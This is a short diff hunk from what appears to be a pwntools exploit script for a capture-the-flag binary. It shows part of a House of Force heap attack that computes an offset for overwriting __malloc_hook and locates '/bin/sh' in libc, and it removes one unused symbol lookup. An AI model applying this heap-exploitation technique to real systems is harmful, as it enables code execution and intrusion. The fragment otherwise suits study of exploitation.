@@ -82,7 +82,6 @@ def rand_leak():
 
 def house_of_force(heap_leak: int):
     __malloc_hook = libc.symbols['__malloc_hook']
-    be_imposter = elf.symbols['be_imposter']
     result_address = __malloc_hook - heap_leak - 0x20
     bin_sh = next(libc.search(b"/bin/sh\x00"))
     log.info(f"/bin/sh @ {hex(bin_sh)}")
